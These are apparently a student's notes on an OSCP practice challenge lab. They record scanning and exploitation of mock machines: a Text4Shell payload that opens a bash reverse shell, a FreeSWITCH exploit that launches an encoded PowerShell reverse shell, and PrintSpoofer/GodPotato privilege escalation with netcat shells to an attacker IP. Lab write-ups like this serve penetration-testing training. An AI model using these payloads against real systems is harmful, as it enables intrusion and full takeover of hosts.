# Questions
This is the second of three dedicated OSCP Challenge Labs. It is composed of six OSCP machines. The intention of this Challenge is to provide a mock-exam experience that closely reflects a similar level of difficulty to that of the actual OSCP exam.

The challenge contains three machines that are connected via Active Directory, and three standalone machines that do not have any dependencies or intranet connections. All the standalone machines have a local.txt and a proof.txt, however the Active Directory set only has a proof.txt on the Domain Controller. While the Challenge Labs have no point values, on the exam the standalone machines would be worth 20 points each for a total of 60 points. The Active Directory set is worth 40 points all together, and the entire domain must be compromised to achieve any points for it at all.

All the intended attack vectors for these machines are taught in the PEN-200 Modules, or are leveraged in PEN-200 Challenge Labs 1-3. However, the specific requirements to trigger the vulnerabilities may differ from the exact scenarios and techniques demonstrated in the course material. You are expected to be able to take the demonstrated exploitation techniques and modify them for the current environment.

Please feel free to complete this challenge at your own pace. While the OSCP exam lasts for 23:45 hours, it is designed so that the machines can be successfully attacked in much less time. While each student is different, we highly recommend that you plan to spend a significant amount of time resting, eating, hydrating, and sleeping during your exam. Thus, we explicitly do not recommend that you attempt to work on this Challenge Lab for 24 hours straight.

We recommend that you begin with a network scan on all the provided IP addresses, and then enumerate each machine based on the results. When you are finished with the Challenge, we suggest that you create a mock-exam report for your own records, according to the advice provided in the Report Writing for Penetration Testers Module.

# I would like to start with standalone Machine which is KIERO .149
sudo ./nmapAutomator.sh -H 192.168.212.149 -t All
[nmap-scan.md]

# Based on the scanning we found 21 22 80 port are active.
gobuster dir -u http://192.168.212.149 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
dirb http://192.168.212.149
# Nothing much can get

# Suddenly feel like to check snmp
snmp-check 192.168.212.149
# Some information feedback..
https://exploit-notes.hdks.org/exploit/network/protocol/snmp-pentesting/

# BERLIN
# From the scanning found a port in 8080
 dirb http://192.168.212.150:8080 /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt

http://192.168.212.150:8080/CHANGELOG
...
# Changelog Version 0.2 - Added Apache Commons Text 1.8 Dependency for String Interpolation Version 0.1 - Initial beta version based on Spring Boot Framework - Added basic search functionality
...
https://github.com/gustanini/CVE-2022-42889-Text4Shell-POC/tree/main
# Found the exploit code from Github
python3 text4shell.py -u 'http://192.168.212.150:8080/search?query=' -c 'whoami' -m 'rce'
Response status code: 200
Response body: {"query":"${script:javascript:java.lang.Runtime.getRuntime().exec('whoami')}","result":""}
# Since it return in code 200, lets create a payload in #!/bin/bash
http://192.168.212.150:8080/search?query=%24%7bscript%3ajavascript%3ajava.lang.Runtime.getRuntime().exec(%27%2fbin%2fbash%20-c%20bash%24IFS%249-i%3e%26%2fdev%2ftcp%2f192.168.45.191%2f8888%3c%261%27)%7d

dev@oscp:~$ cat local.txt




# GUST
# Based on the port scan, we found 8021 is special
searchsploit freeswitch
searchsploit -m 47799

code freeswitch-exploit.py
python3 freeswitch-exploit.py 192.168.212.151 hostname
OSCP
[pwsh-revshell-encode.py]
python3 pwsh-revshell-encode.py
rlwrap nc -lvnp 8888
python3 freeswitch-exploit.py 192.168.212.151 "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEAOQAxACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="

PS C:\Program Files\FreeSWITCH> whoami
oscp\chris
PS C:\Program Files\FreeSWITCH> net user chris
# Just a normal user
PS C:\Program Files\FreeSWITCH> whoami /priv
...
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
...
PS C:\Users\chris\Desktop> type local.txt

# Good, upload printspoofer and NC to try
PS C:\Users\chris\Desktop> .\print.exe -c "C:\Users\chris\Desktop\nc.exe 192.168.45.191 8881 -e powershell"
# Failed or timed out, lets try GodPotato
PS C:\Users\chris\Desktop> ./potato.exe -cmd "cmd /c C:\Users\chris\Desktop\nc.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.191 8881"
C:\Users\Administrator\Desktop>type proof.txt


